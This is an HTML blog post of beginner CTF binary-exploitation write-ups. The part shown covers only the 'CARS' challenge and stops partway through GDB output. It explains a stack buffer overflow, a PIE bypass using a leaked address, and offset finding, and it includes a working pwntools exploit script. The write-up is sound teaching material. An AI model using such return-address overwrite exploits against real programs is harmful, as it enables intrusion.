<!doctype html><html lang=en-gb><head><meta charset=utf-8><meta http-equiv=content-type content="text/html"><meta name=viewport content="width=device-width,initial-scale=1"><title itemprop=name>Blahaj CTF Pwn Writeups | a rant of my adventures</title>
<meta property="og:title" content="Blahaj CTF Pwn Writeups | a rant of my adventures"><meta name=twitter:title content="Blahaj CTF Pwn Writeups | a rant of my adventures"><meta itemprop=name content="Blahaj CTF Pwn Writeups | a rant of my adventures"><meta name=application-name content="Blahaj CTF Pwn Writeups | a rant of my adventures"><meta property="og:site_name" content="a rant of my adventures"><meta name=description content="pwn challenges from blahaj ctf"><meta itemprop=description content="pwn challenges from blahaj ctf"><meta property="og:description" content="pwn challenges from blahaj ctf"><meta name=twitter:description content="pwn challenges from blahaj ctf"><meta property="og:locale" content="en-gb"><meta name=language content="en-gb"><meta itemprop=image content="https://blog.caprinux.com"><meta property="og:image" content="https://blog.caprinux.com"><meta name=twitter:image content="https://blog.caprinux.com"><meta name=twitter:image:src content="https://blog.caprinux.com"><meta property="og:type" content="article"><meta property="og:article:published_time" content="2023-12-03T00:00:00Z"><meta property="article:published_time" content="2023-12-03T00:00:00Z"><script defer type=application/ld+json>{"@context":"http://schema.org","@type":"Article","headline":"Blahaj CTF Pwn Writeups","author":{"@type":"Person","name":""},"datePublished":"2023-12-03","description":"pwn challenges from blahaj ctf","wordCount":5740,"mainEntityOfPage":"True","dateModified":"2023-12-03","image":{"@type":"imageObject","url":""},"publisher":{"@type":"Organization","name":"a rant of my adventures"}}</script><meta name=generator content="Hugo 0.121.1"><link rel=canonical href=https://blog.caprinux.com/posts/ctfs/2023/blahaj-ctf/><link href=/style.min.7ea3f1edcc089ac599d3b3d47809a6c6b3ffdc9a8e1769caf68b5f509f0055cd.css rel=stylesheet><link href=/code-highlight.min.706d31975fec544a864cb7f0d847a73ea55ca1df91bf495fd12a177138d807cf.css rel=stylesheet><link rel=apple-touch-icon sizes=180x180 href=/icons/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=/icons/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/icons/favicon-16x16.png><link rel=mask-icon href=/icons/safari-pinned-tab.svg><link rel="shortcut icon" href=/favicon.ico><link rel=manifest href=https://blog.caprinux.com/site.webmanifest><meta name=msapplication-config content="/browserconfig.xml"><meta name=msapplication-TileColor content="#2d89ef"><meta name=theme-color content="#434648"><link rel=icon type=image/svg+xml href=/icons/favicon.svg></head><body data-theme=dark class=notransition><script src=/js/theme.min.8961c317c5b88b953fe27525839672c9343f1058ab044696ca225656c8ba2ab0.js integrity="sha256-iWHDF8W4i5U/4nUlg5ZyyTQ/EFirBEaWyiJWVsi6KrA="></script><div class=navbar role=navigation><nav class=menu aria-label="Main Navigation"><a href=https://blog.caprinux.com/ class=logo><svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-home"><title>Home</title><path d="M3 9l9-7 9 7v11a2 2 0 01-2 2H5a2 2 0 01-2-2z"/><polyline points="9 22 9 12 15 12 15 22"/></svg></a><input type=checkbox id=menu-trigger class=menu-trigger>
<label for=menu-trigger><span class=menu-icon><svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" stroke="currentcolor" fill="none" viewBox="0 0 14 14"><title>Menu</title><path stroke-linecap="round" stroke-linejoin="round" d="M10.595 7H3.40726"/><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 3.51488H3.49301"/><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 10.4851H3.49301"/><path stroke-linecap="round" stroke-linejoin="round" d="M.5 12.5V1.5c0-.552285.447715-1 1-1h11C13.0523.5 13.5.947715 13.5 1.5v11C13.5 13.0523 13.0523 13.5 12.5 13.5H1.5C.947715 13.5.5 13.0523.5 12.5z"/></svg></span></label><div class=trigger><ul class=trigger-container><li><a class=menu-link href=/>Home</a></li><li><a class="menu-link active" href=/posts/>Posts</a></li><li><a class=menu-link href=/pages/about/>About</a></li><li class=menu-separator><span></span></li></ul><a id=mode href=#><svg xmlns="http://www.w3.org/2000/svg" class="mode-sunny" width="21" height="21" viewBox="0 0 14 14" stroke-width="1"><title>LIGHT</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="7" y1=".5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1=".5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"/></g></svg><svg xmlns="http://www.w3.org/2000/svg" class="mode-moon" width="21" height="21" viewBox="0 0 14 14" stroke-width="1"><title>DARK</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="7" y1=".5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1=".5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"/></g></svg></a></div></nav></div><div class="wrapper post"><main class=page-content aria-label=Content><article><header class=header><h1 class=header-title>Blahaj CTF Pwn Writeups</h1><div class=post-meta><time datetime=2023-12-03T00:00:00+00:00 itemprop=datePublished>3 Dec 2023</time></div></header><details class=toc open><summary><b>Table of Contents</b></summary><nav id=TableOfContents><ul><li><a href=#cars>CARS</a><ul><li><a href=#analyzing-the-program>Analyzing the program</a><ul><li><a href=#black-box-analysis>Black-Box analysis</a></li><li><a href=#looking-at-the-source-code>Looking at the source code</a></li></ul></li><li><a href=#understanding-how-and-what-to-exploit>Understanding how and what to Exploit</a><ul><li><a href=#overflow-what>Overflow what?</a></li><li><a href=#overflow-how>Overflow how?</a></li></ul></li><li><a href=#exploit>Exploit</a><ul><li><a href=#find-our-padding>Find our padding</a></li><li><a href=#final-solution>Final Solution</a></li><li><a href=#a-small-hiccup-movaps-issue>A small hiccup: MOVAPS issue</a></li></ul></li></ul></li><li><a href=#warpdrive>warpdrive</a><ul><li><a href=#analyzing-the-program-1>Analyzing the program</a></li><li><a href=#solving-the-challenge>Solving the challenge</a></li></ul></li><li><a href=#notepad>Notepad</a><ul><li><a href=#analyzing-the-program-2>Analyzing the program</a></li><li><a href=#vulnerability-analysis>Vulnerability Analysis</a></li><li><a href=#exploiting-the-program-ret2libc>Exploiting the Program: ret2libc</a><ul><li><a href=#the-global-offset-table>The Global Offset Table</a></li><li><a href=#back-to-leaking>Back to leaking</a></li><li><a href=#stage-1-exploit>Stage 1 Exploit</a></li></ul></li><li><a href=#getting-a-shell>Getting a shell</a></li></ul></li><li><a href=#finale-christmas>FINALE: Christmas</a><ul><li><a href=#analysis>Analysis</a><ul><li><a href=#brief-overview>Brief Overview</a></li><li><a href=#adding-a-wish-malloc>Adding a Wish (malloc)</a></li><li><a href=#removing-a-wish-free>Removing a Wish (free)</a></li><li><a href=#view-a-wish>View a Wish</a></li><li><a href=#hidden-in-plainsight>Hidden in Plainsight</a></li></ul></li><li><a href=#exploit-strategy>Exploit Strategy</a><ul><li><a href=#arbitrary-read>Arbitrary Read</a></li><li><a href=#arbitrary-write-heap-overflow>Arbitrary Write: Heap Overflow</a></li><li><a href=#what-next>What next?</a></li></ul></li><li><a href=#solution-1-most-straightforward-solution-using-everything-mentioned-so-far>SOLUTION 1: Most Straightforward Solution, using everything mentioned so far</a><ul><li><a href=#summary>Summary</a></li></ul></li><li><a href=#solution-2-solve-without-using-the-heap-overflow-intended-solution>SOLUTION 2: Solve without using the heap overflow [intended solution]</a><ul><li><a href=#summary-1>Summary</a></li></ul></li><li><a href=#solution-3-solve-without-overwriting-limit>SOLUTION 3: Solve without overwriting limit</a><ul><li><a href=#summary-2>Summary</a></li></ul></li></ul></li></ul></nav></details><div class=page-content><p>Blahaj CTF was an entry-level CTF that was targeted at secondary school and JC students in Singapore. Having not touched pwn for awhile, the pwn challenges were fun, refreshing and even challenging. There were a total of 4 pwn challenges, 3 simpler ones and 1 challenging one. The writeups for the 4 challenges are below and in increasing difficulty.</p><p>This writeup aims to be dummy-friendly, and a good guide for absolute beginners to learn binary exploitation.</p><h2 id=cars>CARS</h2><blockquote><p>I&rsquo;ve been playing around with this reporting system for &ldquo;cyber affairs&rdquo;, generating ticket after ticket in hopes of breaking it. I have a feeling that there&rsquo;s a way to access the admin panel&mldr;</p><p>Attachments: <a href=./attachments/pwn/cars/cars>cars</a>, <a href=./attachments/pwn/cars/cars.c>cars.c</a></p></blockquote><h3 id=analyzing-the-program>Analyzing the program</h3><p>In order to exploit the program, we need to be able to understand the program and identify the vulnerability.</p><h4 id=black-box-analysis>Black-Box analysis</h4><p>We can first run <code>checksec</code> and run the program to get a feel for the program&rsquo;s functionality.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>➜ checksec ./cars <span class=c1># we will worry about this later!</span>
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> <span class=s1>&#39;./cars&#39;</span>
</span></span><span class=line><span class=cl>    Arch:     amd64-64-little
</span></span><span class=line><span class=cl>    RELRO:    Partial RELRO
</span></span><span class=line><span class=cl>    Stack:    No canary found
</span></span><span class=line><span class=cl>    NX:       NX enabled
</span></span><span class=line><span class=cl>    PIE:      PIE enabled
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>➜ ./cars
</span></span><span class=line><span class=cl>Welcome to the Cyber Affairs Reporting System <span class=o>(</span>CARS<span class=o>)</span>
</span></span><span class=line><span class=cl>Report number: <span class=c1>#94190627913872</span>
</span></span><span class=line><span class=cl>Please input your student ID: <span class=m>123</span>
</span></span><span class=line><span class=cl>Please describe the incident: asd
</span></span><span class=line><span class=cl>The matter has been recorded and will be investigated. Thank you.
</span></span></code></pre></div><p>As we can see, the program is straightforward and takes in two input, let&rsquo;s move on to look at the source code to see what is going on behind the scenes.</p><h4 id=looking-at-the-source-code>Looking at the source code</h4><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>unsigned</span> <span class=kt>long</span> <span class=n>report_number</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nf>setup</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=nf>srand</span><span class=p>(</span><span class=mh>0xb1adee</span><span class=p>);</span> <span class=c1>// this random seed is sooo drain
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>report_number</span> <span class=o>=</span> <span class=nf>rand</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Welcome to the Cyber Affairs Reporting System (CARS)</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Report number: #%lu</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>report_number</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>file_report</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>As we can see, there is a global variable <code>report_number</code>.</p><blockquote><p>Global variables as such are usually stored in the <strong>bss data segment</strong> at a fixed offset within in a program&rsquo;s memory space.</p><p>In contrast, local variables are saved onto the <strong>stack</strong>, which is always random located due to ASLR <em>(address space layout randomization)</em>.</p></blockquote><p>This <code>report_number</code> seems to be printed via the <strong>printf</strong> function, albeit in a weird way.</p><p>Instead of printing the value <code>report_number</code>, the program prints <code>&amp;report_number</code> which will print the address in memory where <code>report_number</code> resides.</p><p>It then calls the <code>file_report()</code> function.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>void</span> <span class=nf>file_report</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kt>char</span> <span class=n>input</span><span class=p>[</span><span class=mi>28</span><span class=p>];</span>
</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Please input your student ID: &#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>fgets</span><span class=p>(</span><span class=n>input</span><span class=p>,</span> <span class=mi>28</span><span class=p>,</span> <span class=n>stdin</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Please describe the incident: &#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>fgets</span><span class=p>(</span><span class=n>input</span><span class=p>,</span> <span class=mi>256</span><span class=p>,</span> <span class=n>stdin</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;The matter has been recorded and will be investigated. Thank you.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>In this function, the program takes two input via the <code>fgets()</code> function and into the <code>input</code> local variable.</p><p>The <code>input</code> variable is defined to be a character variable of size <strong>28</strong>. However, the second <code>fgets()</code> function attempts to read <strong>256</strong> characters into <code>input</code>. This results in a <strong>buffer overflow</strong>!</p><p>Now that we have found the vulnerability, we can move on to planning our exploit.</p><h3 id=understanding-how-and-what-to-exploit>Understanding how and what to Exploit</h3><p>Given a buffer overflow vulnerability, what can we do? Let&rsquo;s first gain a deeper understanding into where our input is going, and what it will overflow into.</p><h4 id=overflow-what>Overflow what?</h4><pre tabindex=0><code>top of stack
┌───────────────────────┐
│                       │ input
│       input[28]       │ flows
│                       │ downwards ↓
├───────────────────────┤
│                       │
│       saved rbp       │
│                       │
├───────────────────────┤
│                       │
│    return address     │
│                       │
└───────────────────────┘
bottom of stack
</code></pre><p>In order to understand this, we have to understand a few things.</p><ol><li>Every function has it&rsquo;s own allocated stack space in memory.</li><li>When function A <strong>calls</strong> function B, it will need to somehow <strong>keep track and remember where to resume execution</strong> when function B is returning to function A.<ul><li>as such, it saves the <strong>instruction pointer</strong> on the stack, which is the return address <em>(or the address that function B will return to after it is done)</em></li><li>and it saves the <strong>stack pointer</strong> on the stack, which points to the stack space of the caller function <em>(function A)</em></li><li>this allows function B to return to function A gracefully</li></ul></li></ol><p><em>tldr, the important part to understand is that the <strong>return address</strong> shown in the stack above is the address of the instruction that the program will return to after it is done with the <code>file_report</code> function. (which is in main function, since main function called file_report)</em></p><p>This, we are able to overflow into the return address, to get the program to return to anywhere that we want.</p><h4 id=overflow-how>Overflow how?</h4><p>If we look at the source code, we can spot one very interesting function:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>void</span> <span class=nf>admin</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=c1>// how did you even get here?
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>FILE</span> <span class=o>*</span><span class=n>fptr</span> <span class=o>=</span> <span class=nf>fopen</span><span class=p>(</span><span class=s>&#34;flag&#34;</span><span class=p>,</span> <span class=s>&#34;r&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>fptr</span> <span class=o>==</span> <span class=nb>NULL</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Cannot open flag</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>exit</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=kt>char</span> <span class=n>c</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=p>((</span><span class=n>c</span> <span class=o>=</span> <span class=nf>fgetc</span><span class=p>(</span><span class=n>fptr</span><span class=p>))</span> <span class=o>!=</span> <span class=n>EOF</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;%c&#34;</span><span class=p>,</span> <span class=n>c</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=nf>fclose</span><span class=p>(</span><span class=n>fptr</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>This function seems like our goal, which will read and give us the flag.</p><p>If we are able to overwrite our return address with the address of this function, we will be able to call this function and get the flag.</p><p>However, do we know the address of the <code>admin()</code> function?</p><p>If we look at the <code>checksec</code> output above, we note that the program has the <a href=https://www.redhat.com/en/blog/position-independent-executables-pie><strong>Positional Independent Executable (PIE)</strong></a>. This essentially means that the program is loaded at a random address everytime that it is executed, which means that we will not be able to determine the <code>admin()</code> function without an address leak.</p><p>Thankfully, from the <code>main()</code> function, we saw that the program printed us the address of the <code>report_number</code> global variable. Let&rsquo;s see how we can get this to work.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>➜ nm ./cars
</span></span><span class=line><span class=cl><span class=c1># ... truncated ...</span>
</span></span><span class=line><span class=cl>000000000000128e T admin
</span></span><span class=line><span class=cl><span class=m>0000000000004090</span> B report_number
</span></span><span class=line><span class=cl><span class=c1># ... truncated ...</span>
</span></span></code></pre></div><p>In the output shown above, we have the offset of the <code>admin()</code> function and the <code>report_number</code> variable from the base of where the executable is loaded in memory.</p><p>Given the address of <code>report_number</code>, we can do the following:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-py data-lang=py><span class=line><span class=cl><span class=n>ADDRESS_OF_ADMIN</span> <span class=o>=</span> <span class=n>REPORT_NUMBER_ADDRESS</span> <span class=o>-</span> <span class=mh>0x4090</span> <span class=o>+</span> <span class=mh>0x128E</span>
</span></span></code></pre></div><h3 id=exploit>Exploit</h3><p>In order to find the padding it takes to overwrite the return address, we can use a <a href=https://en.wikipedia.org/wiki/De_Bruijn_sequence>cyclic/de-brujin sequence</a> to find our return address.</p><h4 id=find-our-padding>Find our padding</h4><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>➜ cyclic -n8 <span class=m>100</span>
</span></span><span class=line><span class=cl>aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>➜ gdb cars
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>pwndbg&gt; run
</span></span><span class=line><span class=cl>Starting program: ./cars
</span></span><span class=line><span class=cl><span class=o>[</span>Thread debugging using libthread_db enabled<span class=o>]</span>
</span></span><span class=line><span class=cl>Using host libthread_db library <span class=s2>&#34;/lib/x86_64-linux-gnu/libthread_db.so.1&#34;</span>.
</span></span><span class=line><span class=cl>Welcome to the Cyber Affairs Reporting System <span class=o>(</span>CARS<span class=o>)</span>
</span></span><span class=line><span class=cl>Report number: <span class=c1>#93824992247952</span>
</span></span><span class=line><span class=cl>Please input your student ID: a
</span></span><span class=line><span class=cl>Please describe the incident: aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa
</span></span><span class=line><span class=cl>The matter has been recorded and will be investigated. Thank you.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Program received signal SIGSEGV, Segmentation fault.
</span></span><span class=line><span class=cl>0x000055555555528d in file_report <span class=o>()</span> at pie_rop.c:22
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>... truncated ...
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>► 0x55555555528d &lt;file_report+113&gt;    ret    &lt;0x6161616161616166&gt;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>pwndbg&gt; cyclic -n8 -l *<span class=o>(</span>long*<span class=o>)</span>rsp
</span></span><span class=line><span class=cl>Finding cyclic pattern of <span class=m>8</span> bytes: b<span class=s1>&#39;faaaaaaa&#39;</span> <span class=o>(</span>hex: 0x6661616161616161<span class=o>)</span>
</span></span><span class=line><span class=cl>Found at offset <span class=m>40</span>
</span></span></code></pre></div><h4 id=final-solution>Final Solution</h4><p>Let&rsquo;s try to piece together our exploit in a single pwntools script.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-py data-lang=py><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># run the program</span>
</span></span><span class=line><span class=cl><span class=n>p</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=s2>&#34;./cars&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;Report number: #&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>REPORT_NUMBER_ADDRESS</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>p</span><span class=o>.</span><span class=n>recvline</span><span class=p>())</span>
</span></span><span class=line><span class=cl><span class=n>ADDRESS_OF_ADMIN</span> <span class=o>=</span> <span class=n>REPORT_NUMBER_ADDRESS</span> <span class=o>-</span> <span class=mh>0x4090</span> <span class=o>+</span> <span class=mh>0x128E</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Please input your Student ID:</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;id&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Please describe the incident: (vulnerable!!)</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=sa>b</span><span class=s2>&#34;A&#34;</span><span class=o>*</span><span class=mi>40</span>  <span class=c1># pad our return address</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>ADDRESS_OF_ADMIN</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span></code></pre></div><p>If we try to run this script,</p><pre tabindex=0><code>[+] Starting local process &#39;./cars&#39;: pid 1543708
[*] Switching to interactive mode
Please input your student ID: Please describe the incident: The matter has been recorded and will be investigated. Thank you.
[*] Got EOF while reading in interactive
[*] Process &#39;./cars&#39; stopped with exit code -11 (SIGSEGV) (pid 1543708)
[*] Got EOF while sending in interactive
</code></pre><p>it crashes with a SIGSEGV signal.</p><h4 id=a-small-hiccup-movaps-issue>A small hiccup: MOVAPS issue</h4><p>We can add a line to debug our script.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-py data-lang=py><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># run the program</span>
</span></span><span class=line><span class=cl><span class=n>p</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=s2>&#34;./cars&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>gdb</span><span class=o>.</span><span class=n>attach</span><span class=p>(</span><span class=n>p</span><span class=p>)</span>  <span class=c1># ATTACH OUR DEBUGGER</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;Report number: #&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>REPORT_NUMBER_ADDRESS</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>p</span><span class=o>.</span><span class=n>recvline</span><span class=p>())</span>
</span></span><span class=line><span class=cl><span class=n>ADDRESS_OF_ADMIN</span> <span class=o>=</span> <span class=n>REPORT_NUMBER_ADDRESS</span> <span class=o>-</span> <span class=mh>0x4090</span> <span class=o>+</span> <span class=mh>0x128E</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Please input your Student ID:</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;id&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Please describe the incident: (vulnerable!!)</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=sa>b</span><span class=s2>&#34;A&#34;</span><span class=o>*</span><span class=mi>40</span>  <span class=c1># pad our return address</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>ADDRESS_OF_ADMIN</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span></code></pre></div><p>In our GDB, we can do <code>continue</code> to continue the program until it crashes.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-py data-lang=py><span class=line><span class=cl><span class=n>pwndbg</span><span class=o>&gt;</span> <span class=k>continue</span>
</span></span><span class=line><span class=cl><span class=n>Continuing</span><span class=o>.</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>Program</span> <span class=n>received</span> <span class=n>signal</span> <span class=n>SIGSEGV</span><span class=p>,</span> <span class=n>Segmentation</span> <span class=n>fault</span><span class=o>.</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>[</span> <span class=n>REGISTERS</span> <span class=o>/</span> <span class=n>show</span><span class=o>-</span><span class=n>flags</span> <span class=n>off</span> <span class=o>/</span> <span class=n>show</span><span class=o>-</span><span class=n>compact</span><span class=o>-</span><span class=n>regs</span> <span class=n>off</span> <span class=p>]</span>
</span></span><span class=line><span class=cl><span class=o>*</span><span class=n>RSP</span>  <span class=mh>0x7ffd7586b648</span> <span class=err>◂—</span> <span class=mh>0x0</span>
</span></span><span class=line><span class=cl><span class=p>[</span> <span class=n>DISASM</span> <span class=o>/</span> <span class=n>x86</span><span class=o>-</span><span class=mi>64</span> <span class=o>/</span> <span class=nb>set</span> <span class=n>emulate</span> <span class=n>on</span> <span class=p>]</span>
</span></span><span class=line><span class=cl> <span class=err>►</span> <span class=mh>0x7f7cb895b4c0</span> <span class=o>&lt;</span><span class=n>_int_malloc</span><span class=o>+</span><span class=mi>2832</span><span class=o>&gt;</span>    <span class=n>movaps</span> <span class=n>xmmword</span> <span class=n>ptr</span> <span class=p>[</span><span class=n>rsp</span> <span class=o>+</span> <span class=mh>0x10</span><span class=p>],</span> <span class=n>xmm1</span>
